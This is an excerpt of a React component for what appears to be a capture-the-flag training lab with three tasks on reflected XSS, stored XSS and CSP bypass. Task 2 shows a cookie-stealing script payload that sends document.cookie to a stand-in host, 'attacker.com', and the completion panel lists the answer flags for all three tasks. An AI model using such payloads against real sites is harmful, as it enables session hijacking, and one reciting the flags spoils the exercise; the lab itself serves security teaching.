    ...
    <div className="space-y-6">
      ...
      <TaskShell number={1} title="Reflected XSS" unlocked completed={done("task_1")}>
        <p className="text-ink-2 text-sm mb-3">
          ...
          The URL parameter <code className="font-mono text-warn">q</code> is echoed into the DOM:
        </p>
        <div className="rounded-lg bg-surface-0 border border-edge p-4 mb-3 space-y-2">
          <p className="font-mono text-xs text-ink-3">URL:</p>
          <code className="font-mono text-xs text-warn break-all">
            https://example.com/search?q=&lt;user input reflected here&gt;
          </code>
          <p className="font-mono text-xs text-ink-3 mt-3">Vulnerable page source:</p>
          <pre className="font-mono text-xs text-cyan-300">{`<div>Results for: {query}</div>`}</pre>
          <p className="text-xs text-ink-3 mt-2">No encoding or sanitization applied — whatever the user provides is rendered as HTML.</p>
        </div>
        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-2">
            <p className="text-sm text-ink-2 font-medium">What payload triggers an alert box?</p>
            <p className="text-xs text-ink-3 mb-2">
              Enter a payload containing a <code className="font-mono text-warn">&lt;script&gt;</code> tag and an <code className="font-mono text-warn">alert()</code> call.
            </p>
      ...
      <TaskShell number={2} title="Stored XSS" unlocked={done("task_1")} completed={done("task_2")}>
        ...
        <div className="rounded-lg bg-surface-0 border border-edge p-4 mb-4 space-y-3">
          <p className="font-mono text-xs text-ink-3">Stored comment (rendered as-is from DB):</p>
          <pre className="font-mono text-xs text-danger whitespace-pre-wrap break-all">{`<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`}</pre>
        ...
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-3">
            <p className="text-sm text-ink-2 font-medium">What data does this payload steal?</p>
      ...
      <TaskShell number={3} title="CSP Bypass" unlocked={done("task_2")} completed={done("task_3")}>
        ...
        <div className="rounded-lg bg-surface-0 border border-edge p-4 mb-4">
          <p className="font-mono text-xs text-ink-3 mb-2">Response header from server:</p>
          <code className="font-mono text-xs text-warn break-all">
        ...
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-3">
            <p className="text-sm text-ink-2 font-medium">Which domain can be abused to bypass this CSP?</p>
            <div className="flex flex-col gap-2">
      ...
      {allDone && (
        <div className="rounded-lg border border-ok-edge bg-ok-wash p-5 space-y-3">
          ...
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-ink-3">Task 1 —</span> <span className="text-ok">SAGE&#123;r3fl3ct3d_xss_p0p&#125;</span></li>
            <li><span className="text-ink-3">Task 2 —</span> <span className="text-ok">SAGE&#123;st0r3d_xss_c00k13_th3ft&#125;</span></li>
            <li><span className="text-ink-3">Task 3 —</span> <span className="text-ok">SAGE&#123;cdn_bypass_csp_byp4ss&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
